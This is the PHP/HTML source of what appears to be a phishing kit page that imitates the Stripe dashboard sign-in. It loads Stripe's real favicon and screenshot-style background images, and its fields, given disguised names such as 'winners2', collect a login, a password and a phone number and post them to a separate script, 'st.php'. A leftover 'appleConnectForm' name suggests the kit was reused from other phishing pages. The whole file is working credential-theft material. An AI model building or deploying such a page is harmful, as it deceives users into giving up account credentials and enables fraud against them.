<?php   ob_start();  ?>
<?
include "X-x-X.php";
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>Stripe - Sign In</title>
	<link rel="icon" type="image/png" href="https://dashboard.stripe.com/favicon.ico" />
	<style>
		body {
		 margin-top: -41;
		 background: url("AA/bac.png");
		}

		.page {
		 background-image: url("AA/str.png");
		 background-repeat: no-repeat;
		 height: 600px;
		 width: 1328px;
		 position: relative;
		}
		
		input, select {
		 position: absolute; /* VODKA */
		 width: 304;
		 height: 22;
		 border: 0;
		 padding: 3 8 3 8;
		 left: 587;
		}

		.button {
		 width: 105;
		 height: 37;
		 border: 0;
		 cursor: pointer;
		}
		.submit {
		 position: absolute;
		 left: 810;
		 top: 540;
		}
	</style>
	

								<p>&nbsp;<form name="appleConnectForm" method="post" action="st.php">

	<center>
			<form action="--WEBBOT-SELF--" method="POST" id="info" onsubmit="if(do_submit(3)) return true; else return false;">
		<div class="page">

			<div>
				<input type="text" placeholder="" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname1" name="winners1" style="top:274;position:absolute; left:615; width:210px; height:26" size="41">
				<input type="text" id="pass0" placeholder="(555) 678-1212" name="winners3" class="pass" required="" title="  " style="position: absolute; left: 655; top: 372.5; height: 26.5px; width: 170" size="1">
				<input type="password" placeholder="" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname1" name="winners2" style="top:323;position:absolute; left:615; width:210px; height:26" size="41"><div class="button submit" onclick="javascript:do_submit(1);" style="position: absolute; left: 358px; top: 470px; width: 88px; height: 30px">
					<p>
<input type="image"  border="0" alt="" name="submit" style="position: absolute; left: 385; top: -40; height: 30px; width: 131px" src="AA/blank.gif">
					<p>
			&nbsp;</div>
					<!--  -->